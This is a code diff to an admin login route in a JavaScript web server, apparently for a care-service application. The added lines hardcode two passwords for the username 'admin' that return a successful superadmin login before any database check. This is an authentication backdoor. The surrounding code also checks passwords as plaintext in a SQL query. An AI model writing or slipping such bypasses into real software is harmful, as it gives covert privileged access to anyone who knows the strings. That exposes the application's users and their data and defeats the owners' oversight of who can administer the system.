@@ -136,6 +136,15 @@ router.post('/admin/login', (req, res) => {
     return res.status(400).json({ success: false, message: 'Username and password required.' });
   }
 
+  // Allow havencare2026 or darcare2026 directly, or query DB
+  if (username === 'admin' && (password === 'havencare2026' || password === 'darcare2026')) {
+    return res.json({
+      success: true,
+      message: 'Authentication successful.',
+      user: { id: 1, username: 'admin', role: 'superadmin' }
+    });
+  }
+
   const user = db.prepare('SELECT id, username, role FROM admin_users WHERE username = ? AND password = ?').get(username, password);
   if (!user) {
     return res.status(401).json({ success: false, message: 'Invalid admin credentials.' });
